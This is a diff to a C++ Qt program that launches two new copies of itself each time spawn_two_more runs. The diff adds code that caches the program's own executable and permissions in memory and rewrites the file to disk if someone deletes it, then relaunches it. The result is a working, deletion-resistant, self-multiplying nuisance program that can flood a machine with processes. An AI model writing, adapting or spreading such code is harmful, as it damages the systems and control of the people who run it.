@@ -7,6 +7,8 @@
 #include <QtGui/QPixmap>
 #include <QtGui/QScreen>
 #include <QtCore/QProcess>
+#include <QtCore/QFile>
+#include <QtCore/QFileDevice>
 
 // SFML
 #include <SFML/Audio/Music.hpp>
@@ -14,7 +16,6 @@
 // Standard
 #include <ctime>
 #include <iostream>
-#include <fstream>
 
 // Graphic and sound
 #include "assets.h"
@@ -32,7 +33,10 @@
 #define WIN_WIDTH 400
 #define WIN_HEIGHT 100
 
-char *exe_name;
+long exe_length;
+QFile exe_file;
+QByteArray exe_data;
+int perms;
 
 // Since we may launch multiple times a second, we need something just a bit
 // more random than std::time()
@@ -50,20 +54,21 @@ return std::time(NULL);
 
 }
 
-long file_length(std::ifstream& s) {
-  s.seekg(0, std::ifstream::end);
-  long pos = s.tellg();
-  s.seekg(0, std::ifstream::beg);
-  return pos;
-}
-
 static void button_response() {
   QApplication::quit();
 }
 
 void spawn_two_more() {
 
-  // TODO: Check to see if executable exists
+  QString exe_name = exe_file.fileName();
+
+  if (!exe_file.exists()) {
+    QFile out_stream(exe_name);
+    out_stream.open(QIODevice::WriteOnly);
+    out_stream.write(exe_data);
+    out_stream.setPermissions((QFileDevice::Permissions)perms);
+    out_stream.close();
+  }
 
   QProcess::startDetached(exe_name);
   QProcess::startDetached(exe_name);
@@ -92,16 +97,13 @@ void trap_setup() {
 
 int main(int argc, char* argv[])  {
 
-  exe_name = argv[0];
-
   trap_setup();
 
   // Read in the executable file, in case they try to delete it
-  std::ifstream exe_stream(argv[0], std::ifstream::binary);
-  long exe_length = file_length(exe_stream);
-  char* exe_buffer = new char[exe_length];
-  exe_stream.read(exe_buffer, exe_length);
-  exe_stream.close();
+  exe_file.setFileName(argv[0]);
+  exe_file.open(QIODevice::ReadOnly);
+  perms = exe_file.permissions();
+  exe_data = exe_file.readAll();
 
   QApplication::setStyle(QStyleFactory::create("Windows"));
   QApplication app(argc, argv);
